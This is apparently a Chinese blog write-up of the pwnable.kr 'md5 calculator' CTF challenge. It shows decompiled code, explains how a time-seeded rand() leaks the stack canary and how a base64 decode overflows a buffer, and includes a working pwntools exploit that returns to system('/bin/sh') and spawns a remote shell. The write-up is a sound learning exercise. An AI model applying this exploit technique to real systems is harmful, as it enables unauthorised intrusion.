---
title: pwnable.kr-md5 calculator
date: 2018-02-25 17:37:00
tags: [pwnable.kr,PWN]
categories: CTF
---
# 前言
也是一个很有pwn味道的题目，涉及的知识在掌握范围内所以做起来很爽！
# 分析
题目只给了可执行文件`hash`。于是就放到`ida`中逆向了。
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax@1
  int v5; // [sp+18h] [bp-8h]@1
  int v6; // [sp+1Ch] [bp-4h]@1

  setvbuf(stdout, 0, 1, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("- Welcome to the free MD5 calculating service -");
  v3 = time(0);
  srand(v3);
  v6 = my_hash();
  printf("Are you human? input captcha : %d\n", v6);
  __isoc99_scanf("%d", &v5);
  if ( v6 != v5 )
  {
    puts("wrong captcha!");
    exit(0);
  }
  puts("Welcome! you are authenticated.");
  puts("Encode your data with BASE64 then paste me!");
  process_hash();
  puts("Thank you for using our service.");
  system("echo `date` >> log");
  return 0;
}
```
```c
int my_hash()
{
  int result; // eax@4
  int v1; // edx@4
  signed int i; // [sp+0h] [bp-38h]@1
  char v3[32]; // [sp+Ch] [bp-2Ch]@2
  int v4; // [sp+10h] [bp-28h]@4
  int v5; // [sp+14h] [bp-24h]@4
  int v6; // [sp+18h] [bp-20h]@4
  int v7; // [sp+1Ch] [bp-1Ch]@4
  int v8; // [sp+20h] [bp-18h]@4
  int v9; // [sp+24h] [bp-14h]@4
  int v10; // [sp+28h] [bp-10h]@4
  int v11; // [sp+2Ch] [bp-Ch]@1

  v11 = *MK_FP(__GS__, 20);
  for ( i = 0; i <= 7; ++i )
    *(_DWORD *)&v3[4 * i] = rand();
  result = v7 - v9 + v10 + v11 + v5 - v6 + v4 + v8;
  v1 = *MK_FP(__GS__, 20) ^ v11;
  return result;
}
```
```c
int process_hash()
{
  int v0; // ST14_4@3
  char *ptr; // ST18_4@3
  char v3; // [sp+1Ch] [bp-20Ch]@1
  int v4; // [sp+21Ch] [bp-Ch]@1

  v4 = *MK_FP(__GS__, 20);
  memset(&v3, 0, 0x200u);
  while ( getchar() != 10 )
    ;
  memset(g_buf, 0, sizeof(g_buf));
  fgets(g_buf, 1024, stdin);
  memset(&v3, 0, 0x200u);
  v0 = Base64Decode(g_buf, (int)&v3);
  ptr = calc_md5((int)&v3, v0);
  printf("MD5(data) : %s\n", ptr);
  free(ptr);
  return *MK_FP(__GS__, 20) ^ v4;
}
```
```c
int __cdecl Base64Decode(const char *a1, int a2)
{
  signed int v2; // ST2C_4@1
  FILE *stream; // ST34_4@1
  int v4; // eax@1
  int v5; // ST38_4@1
  int v6; // eax@1
  int v7; // ST3C_4@1

  v2 = calcDecodeLength(a1);
  stream = (FILE *)fmemopen((int)a1, strlen(a1), (int)&unk_8049272);
  v4 = BIO_f_base64();
  v5 = BIO_new(v4);
  v6 = BIO_new_fp(stream, 0);
  v7 = BIO_push(v5, v6);
  BIO_set_flags(v7, 256);
  *(_BYTE *)(a2 + BIO_read(v7, a2, strlen(a1))) = 0;// overflow
  BIO_free_all(v7);
  fclose(stream);
  return v2;
}
```
贴出来了最关键的几个函数。通过ida反编译的代码还是很容易理清程序逻辑的，其中可以发现两处漏洞。
- `my_hash`函数中使用的变量`v11`其实是`stack canary`。
- `Base64Decode`函数会把`a1`地址处的字符串base64解码，然后会把解码后的数据复制到`a2`所指示的缓冲区内，这里由于最大复制长度使用`strlen(a1)`而不是`a2`的长度导致溢出。

程序的保护如下
```bash
root@1:~/桌面/test$ checksec hash
[*] '/home/root/\xe6\xa1\x8c\xe9\x9d\xa2/test/hash'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```
由于是栈溢出漏洞，只要通过`my_hash`函数的漏洞leak出`canary`就可以getshell。在`my_hash`中调用了`rand`函数，只要随机种子一样那么就可以预测任意一次的随机值，另外`time(0)`函数返回的时间是以秒为单位的，所以完全可以获得种子。
接下来就可以栈溢出覆盖返回地址了。`system`的地址可以使用它的plt地址，那`/bin/sh`地址呢？这里可以让程序溢出时重新跳入`process_hash`函数然后输入该字符串，把该字符串存储在数据段，由于数据段地址不变所以可以这样利用。
整理下利用思路：
1. 在连接题目时本地同样以`time`函数设置随机种子，获得随机序列并计算`canary`
2. 布置栈空间，使程序溢出时执行`process_hash`函数并向数据段写入`/bin/sh`

下面是exp
```python
import ctypes
import base64
from pwn import *

def work(DEBUG):
    context(arch='i386',os='linux',log_level='info')
    ll = ctypes.cdll.LoadLibrary
    lib = ll('libc.so.6')
    system_plt = 0x08048880
    process_hash_addr = 0x08048f92
    data_var = 0x0804b0e0
    
    if DEBUG:
        r = process('./hash')
    else:
        r = remote('pwnable.kr',9002)
        
    lib.srand(lib.time(0))
    # my_hash
    v3 = lib.rand()
    v4 = lib.rand()
    v5 = lib.rand()
    v6 = lib.rand()
    v7 = lib.rand()
    v8 = lib.rand()
    v9 = lib.rand()
    v10 = lib.rand()
    
    r.recvuntil(' : ')
    rel = int(r.recvuntil('\n'))
    canary = rel-v7+v9-v10-v5+v6-v4-v8
    canary &= 0xffffffff  
    
    payload = 'a'*0x200 #junk code
    payload += p32(canary)+'a'*12
    payload += p32(process_hash_addr)+p32(system_plt)#ret addr
    payload += 'a'*4+p32(data_var)
    payload = base64.b64encode(payload)
    
    r.sendline(str(rel))
    r.recvuntil('me!\n')
    r.sendline(payload+'\n')
    r.recvuntil('\n')
    r.sendline('/bin/sh')
    r.recvuntil('\n')
    r.interactive()
    

work(False)
```
```bash
root@1:~/桌面/test$ python 1.py
[+] Opening connection to pwnable.kr on port 9002: Done
[*] Switching to interactive mode
$ ls
flag
log
log2
md5calculator
super.pl
$ cat flag
Canary, Stack guard, Stack protector.. what is the correct expression?
$  
```
要注意的是，如果网速太差就会导致`canary`计算错误，解决办法是将exp上传到题目服务器本地执行（看题目提示）
# 总结
`stack canary`能很好的防止栈溢出，但是程序的其他地方如果能够泄漏`canary`还是没卵用。